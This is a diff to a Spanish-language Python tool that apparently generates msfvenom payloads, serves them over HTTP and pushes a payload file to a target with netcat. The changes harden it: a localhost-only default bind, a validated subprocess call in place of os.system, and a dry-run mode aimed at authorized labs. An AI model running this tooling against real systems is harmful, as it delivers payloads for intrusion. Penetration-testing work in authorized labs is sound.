@@ -28,11 +28,11 @@ import time
 
 import threading
 
+import functools
 import http.server
-
 import socketserver
-
 import socket
+
 
 from datetime import datetime
 
@@ -54,11 +54,13 @@ class PayloadHTTPServer:
 
 
 
-    def __init__(self, directorio="payloads", puerto=8080):
+    def __init__(self, directorio="payloads", puerto=8080, host="127.0.0.1"):
 
-        self.directorio = directorio
+        self.directorio = os.path.abspath(directorio)
 
         self.puerto = puerto
+
+        self.host = host
 
         self.httpd = None
 
@@ -68,15 +70,11 @@ class PayloadHTTPServer:
 
     def iniciar(self):
 
-        os.chdir(self.directorio)
-
-
-
-        handler = http.server.SimpleHTTPRequestHandler
+        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=self.directorio)
 
         try:
 
-            self.httpd = socketserver.TCPServer(("0.0.0.0", self.puerto), handler)
+            self.httpd = socketserver.TCPServer((self.host, self.puerto), handler)
 
         except OSError:
 
@@ -84,7 +82,7 @@ class PayloadHTTPServer:
 
             self.puerto = 8081
 
-            self.httpd = socketserver.TCPServer(("0.0.0.0", self.puerto), handler)
+            self.httpd = socketserver.TCPServer((self.host, self.puerto), handler)
 
 
 
@@ -109,6 +107,8 @@ class PayloadHTTPServer:
         if self.httpd:
 
             self.httpd.shutdown()
+            self.httpd.server_close()
+            self.httpd = None
 
             print("[+] Servidor HTTP detenido.")
 
@@ -212,7 +212,7 @@ class SessionMonitor:
 
             except Exception as e:
 
-                pass
+                print(f"[!] Error del monitor: {e}", file=sys.stderr)
 
             time.sleep(0.5)
 
@@ -400,13 +400,19 @@ bye
 
     def enviar_nc(self, host, puerto):
 
-        """Envía vía Netcat al objetivo."""
+        """Envía vía Netcat sin invocar un intérprete de comandos."""
 
-        cmd = f"nc -w 3 {host} {puerto} < {self.payload_path}"
+        if not str(host).strip() or not str(puerto).isdigit() or not 1 <= int(puerto) <= 65535:
+            raise ValueError("host y puerto no válidos")
+        cmd = ["nc", "-w", "3", str(host).strip(), str(int(puerto))]
 
-        print(f"\n[*] Netcat: {cmd}")
-
-        return os.system(cmd) == 0
+        print(f"\n[*] Netcat: {' '.join(cmd)}")
+        try:
+            with open(self.payload_path, "rb") as payload:
+                return subprocess.run(cmd, stdin=payload, check=False).returncode == 0
+        except FileNotFoundError:
+            print("[!] No se encontró nc.", file=sys.stderr)
+            return False
 
 
 
@@ -636,7 +642,7 @@ class MSFVenomGenerator:
 
             if not os.path.exists(d):
 
-                os.makedirs(d)
+                os.makedirs(d, exist_ok=True)
 
 
 
@@ -1174,7 +1180,39 @@ class MSFVenomGenerator:
 
 
 
+def guided_flow() -> str:
+    """Describe el flujo seguro sin ejecutar comandos externos."""
+    return "\n".join([
+        "MSFVenom Generator — ejecución guiada",
+        "[1] Confirmar alcance escrito y usar una máquina de laboratorio desechable.",
+        "[2] Revisar dependencias y comenzar con --dry-run.",
+        "[3] Generar el artefacto solo tras una confirmación explícita.",
+        "[4] Revisar hash, listener, red de laboratorio y procedimiento de cleanup.",
+        "[5] Detener monitor, listener y servidor HTTP al terminar.",
+    ])
+
+
+def guided_preflight() -> int:
+    """Valida dependencias locales sin lanzar listeners ni generar artefactos."""
+    print(guided_flow())
+    print("\nPreflight:")
+    for command in ("python3", "msfvenom", "msfconsole"):
+        available = __import__("shutil").which(command)
+        print(f"  {'OK' if available else 'FALTA'}: {command}")
+    print("  OK: no se ejecutaron comandos externos ni se crearon payloads.")
+    return 0
+
+
 if __name__ == "__main__":
+    import argparse
+
+    parser = argparse.ArgumentParser(description="Generador MSFVenom para laboratorios autorizados")
+    parser.add_argument("--guided", action="store_true", help="muestra el flujo y preflight sin efectos externos")
+    parser.add_argument("--dry-run", action="store_true", help="alias seguro de --guided")
+    args = parser.parse_args()
+
+    if args.guided or args.dry_run:
+        raise SystemExit(guided_preflight())
 
     try:
 
